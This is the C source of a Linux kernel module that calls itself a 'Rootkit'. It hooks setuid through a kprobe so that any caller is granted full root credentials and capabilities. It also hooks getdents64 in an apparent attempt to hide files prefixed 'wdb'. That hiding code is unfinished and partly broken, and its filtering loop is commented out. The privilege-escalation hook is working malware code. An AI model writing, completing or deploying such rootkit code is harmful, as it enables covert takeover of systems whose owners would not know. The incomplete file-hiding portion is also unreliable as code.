#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/capability.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/atomic.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h>

#include <linux/uaccess.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("otitoko");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.1");

atomic_t hooked = ATOMIC_INIT(0);

#define PREFIX "wdb"
#define MAGIC_UID 50

#define _GLOBAL_ROOT_UID 0
#define _GLOBAL_ROOT_GID 0



void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
{
    printk(KERN_INFO "setuid hook called, elevating privs...");

    struct cred *new_creds = prepare_creds();

    new_creds->uid.val=_GLOBAL_ROOT_UID;
    new_creds->euid.val=_GLOBAL_ROOT_UID;
    new_creds->suid.val=_GLOBAL_ROOT_UID;
    new_creds->fsuid.val=_GLOBAL_ROOT_UID;

    new_creds->gid.val=_GLOBAL_ROOT_GID;
    new_creds->egid.val=_GLOBAL_ROOT_GID;
    new_creds->sgid.val=_GLOBAL_ROOT_GID;
    new_creds->fsgid.val=_GLOBAL_ROOT_GID;

    new_creds->cap_inheritable=CAP_FULL_SET;
    new_creds->cap_permitted=CAP_FULL_SET;
    new_creds->cap_effective=CAP_FULL_SET;
    new_creds->cap_bset=CAP_FULL_SET;
    commit_creds(new_creds);
}
/* Hiding our files from ls */

/* struct for info to be passed from entry handler to post handler */
static struct getdents_data{
    struct linux_dirent64 *dirent_buf;
    int count;
    int skip_file;
};


static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
	struct getdents_data *dentry_data=(struct getdents_data *)ri->data;


	dentry_data->dirent_buf=(void __user *)regs->si;
	dentry_data->count=regs->dx;


	return 0;
}

static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){

	printk(KERN_INFO "executing __x64_sys_getdents64_post_handler");
	struct linux_dirent64 __user *dentry_data=(struct linux_dirent64 *)regs->si;

	struct linux_dirent64 *current_dir,*dirent_ker=NULL;
	unsigned long offset = 0;


	ssize_t ret = regs_return_value(regs);
	printk(KERN_INFO "getdents returned %d bytes", ret);

	if(ret<=(struct linux_dirent64 *)regs->dx){
		printk(KERN_DEBUG "ret is less than count");
	}
	char *kbuf=kzalloc(ret,GFP_KERNEL);
	if(!kbuf)
		printk(KERN_ERR "couldn't allocate mem");

	printk(KERN_DEBUG "mem allocated: %ld bytes",ret);

	if( (ret<=0) || (kbuf == NULL) )
		return ret;


	long error = copy_from_user(kbuf,dentry_data->d_name,ret);
	if(error){
		printk(KERN_ERR "could not copy %ld bytes from user",ret);
		printk(KERN_ERR "copy_from_user error: %ld",error);
	}

/*
	while(offset<ret){
		current_dir = (void *)kbuf+offset;
		dentry_data.d_name_ptr=(unsigned long)(unsigned char *)dirent->d_name;
		printk(KERN_INFO "dentry_data->d_name_ptr is: %l", dentry_data);
		return 0;
	}

		if(dentry_data.skip_file){
			printk(KERN_DEBUG "rootkit found: ");
		}
*/
		return 0;
}

static struct kretprobe  __x64_sys_getdents64_hook= {
	.handler 		= __x64_sys_getdents64_post_handler,
	.kp.symbol_name		="__x64_sys_getdents64",
	.maxactive		=20,
};


struct kprobe __x64_sys_setuid_hook = {
        .symbol_name = "__x64_sys_setuid",
        .post_handler = __x64_sys_setuid_post_handler,
};

static int __init rkin(void)
{
    printk(KERN_INFO "module loaded\n");
    int setuid_registered = register_kprobe(&__x64_sys_setuid_hook);
    int getdents64_registered = register_kretprobe(&__x64_sys_getdents64_hook);
    if (setuid_registered < 0 || getdents64_registered < 0)
    {
        printk(KERN_INFO "failed to register setuid kprobes\n");
    }
    else
    {
        printk(KERN_INFO "hooks registered\n");
        atomic_inc(&hooked);
    }

    return 0;
}

static void __exit rkout(void)
{
    if (atomic_read(&hooked))
    {
	unregister_kretprobe(&__x64_sys_getdents64_hook);
        unregister_kprobe(&__x64_sys_setuid_hook);
        printk(KERN_INFO "unhooked\n");
    }
}

module_init(rkin);
module_exit(rkout);

